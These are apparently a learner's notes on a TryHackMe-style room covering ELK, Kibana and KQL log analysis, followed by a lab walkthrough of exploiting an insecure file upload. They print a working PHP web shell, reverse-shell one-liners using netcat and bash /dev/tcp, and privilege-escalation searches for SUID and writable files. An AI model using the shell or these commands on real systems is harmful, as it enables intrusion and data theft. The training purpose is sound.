Learning Objectives
	Learn about Log analysis and tools like ELK.
		Stack of 3 tools - Elasticsearch, Logstash, and Kibana. 
		Search engine and analytics tool that stores, indexes and analyzes data. 
	Learn about Kibana Query Language (KQL) and how it can be used to investigate logs using ELK.
		Used to query and analyze data in Elasticsearch. 
	Learn about RCE (Remote Code Execution), and how this can be done via insecure file upload.
		Remote access to vulnerable systems as a result of weak input validation. 
Starting w/ ELK
	Kibana 
		Search bar: Enter queries using KQL
		Collections || Index Pattern: group of logs - single hosts, group of hosts w/ similar purpose
		Fields: Data attributes parsed from logs. (e.g., source IP, response, name)
		Timeline: Bar chart displaying event count over time 
		Documents (Logs): info on what's been logged. 
		Time filter: Specify timeframe (e.g., last 24 hours)
	KQL - Similar to Splunk's Search Processing Language (SPL)
		Searches documents for values 
			e.g., we'd use the following syntax to find all documents that matches a specific IP address:
				ip.address:"10.10.10.10" ++ other syntax below

| Query/Sntax  | Description                                                                                           | Example                                      |
| ------------ | ----------------------------------------------------------------------------------------------------- | -------------------------------------------- |
| ""           | Search documents for specific values                                                                  | "10.2.1.243"                                 |
| * (wildcard) | Searches documents for similar matches                                                                | South* (returns South America, South Africa) |
| OR           | Returns documents that contains either value provided                                                 | "South America" OR "Bolivia"                 |
| AND          | Returns documents that contain both values provided                                                   | "Joe" AND "25"                               |
| :            | Searches through a specified field of a document for a value (must be valid field from index pattern) | ip.address: x.x.x.x                          |
Lucene Query
		Used alongside Kibana and supports fuzzy terms (search for documents containing specific terms or regex)
TASK: 
	Our systems alerted the SOC team to a web shell being uploaded to the WareVille Rails booking platform on Oct 1, 2024. Our task is to review the web server logs to determine how the attacker achieved this.
To reduce the amount of 'hits' or log entries, we can click (+, only shows that value) or (-, removes it from log entries) Clicking on filters = applying relevant KQL syntax 

Analyzing the attack 
	File uploads vulnerabilities occur as a result of poorly implemented input validation. 
		Often exploited by remote code execution (upload malicious script directly to webserver) and XSS (steals cookies and send back to attackers server)
	Web Shell
		Remote access by uploading scripts to vulnerable servers. Once configured, attackers can use the infected system as if they own it. Moreover, they can run commands to modify and/or exfiltrate data, move laterally (privilege escalation) + they can add the infected host to a botnet and have it carry out attacks. 

Exploiting RCE via File Upload
	First, identify a vulnerable app. Then, create a malicious file that will allow RCE once uploaded. 
	e.g., PHP File w/ malicious script
```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```
This script displays an input field and after entering input, the underlying OS will run it using the system() PHP function, and the output is displayed to the user. 
	Here's what it looks like for the attacker. 
	![Command being run](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053358453.png)
Linux cmds we can run when probing infected hosts. 

| uname -a                                                  | Will give you some system information like the OS, kernel version, and more\|<br>\|id\|If the current user is assigned to any groups                                          |
| --------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ifconfig                                                  | Allows you to understand the system's network setup                                                                                                                           |
| find / -writable -type  f 2>/dev/null \| grep -v "/proc/" | \|Also helpful in privilege escalation attempts used to find files with writable permissions\|                                                                                |
| find / -perm -4000 -type f 2>/dev/null                    | Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root) |
| nc -e /bin/sh <your-ip> <port>                            | A command used to begin a reverse shell via Netcat                                                                                                                            |
| bash -i >& /dev/tcp/<your-ip>/<port> 0>&1                 | A command used to begin a reverse shell via bash                                                                                                                              |
Practical 
	Investigate logs 
	Recreate attack on frostypines.thm 
		access by referencing url in hosts file 
			echo "10.10.107.238 frostypines.thm" >> /etc/hosts
		
![[Pasted image 20250119171537.png]]
![[Pasted image 20250119171727.png]]
Before the attack, I created a shell.php file containing the code mentioned earlier in the room that executes a web shell when ran
Then, I navigated to the website's admin console, created a new room and uploaded the shell.php file where the website is expecting a photo of the new room. 
I discovered the link by selecting 'copy image link' on another photo, then modified the path to open shell.php. 
![[Pasted image 20250119174350.png]]


Since the question is requesting information about flag.txt, I ran 'ls' to locate the file.
	![[Pasted image 20250120135522.png]]
Lastly, I used cat to output the text in the web shell. 
	![[Pasted image 20250120135617.png]]

![[Pasted image 20250120135716.png]]